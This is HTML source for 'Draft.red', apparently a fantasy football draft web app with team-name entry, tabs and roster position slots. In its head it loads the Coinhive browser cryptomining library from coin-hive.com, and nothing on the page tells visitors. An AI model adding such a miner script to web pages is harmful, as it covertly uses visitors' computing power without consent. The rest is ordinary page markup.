<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Draft.red</title>
    <link rel="stylesheet" href="./style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <script type="text/javascript">
      if (window.location.hash == "") window.location.hash = "#"+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10);
    </script>
  </head>
  <body>
    <div id="landing">
      <div id="logo">
        DRAFT<wbr>.<span style="color: #F00;">RED</span>
      </div>
    </div>
    <input type="text" id="start" class="tab" placeholder="Team Name" spellcheck="false">
    <div id="tabs">
      <div id="name" class="tab" data-show="myteam" onclick="tab(this)"></div>
      <div id="league" class="tab" data-show="myleague" onclick="tab(this)">My League</div>
      <div id="draft" class="tab" data-show="mydraft" onclick="tab(this)">Draft Players</div>
    </div>
    <div id="portal">
      <div id="myteam" class="screen" style="display: inherit;">
        <div class="block" title="Quarter Back" id="qb">
          QB
          <div class="blockchild"></div>
        </div>
        <div class="block" title="Wide Receiver" id="wr">
          WR
          <div class="blockchild"></div>
        </div>
        <div class="block" title="Tight End" id="te">
          TE
          <div class="blockchild"></div>
        </div>
        <div class="block" title="Bench" id="bn">
          BN
          <div class="blockchild"></div>
        </div>
        <div class="block" title="Kicker" id="k">
          K
          <div class="blockchild"></div>
        </div>
        <div class="block" title="Running Back" id="rb">
          RB
          <div class="blockchild"></div>
        </div>
        <div class="block" title="Defence/Special Teams" id="dst">
          D/ST
          <div class="blockchild"></div>
        </div>
        <div class="block" title="Flex Player" id="flex">
          FLEX
          <div class="blockchild"></div>
        </div>
      </div>
      <div id="myleague" class="screen">
        2
      </div>
      <div id="mydraft" class="screen">
        3
      </div>
    </div>
    <script src="https://cdn.rawgit.com/chancejs/chancejs/b1b61100/chance.js" charset="utf-8"></script>
    <script src="./index.js" charset="utf-8"></script>
  </body>
</html>
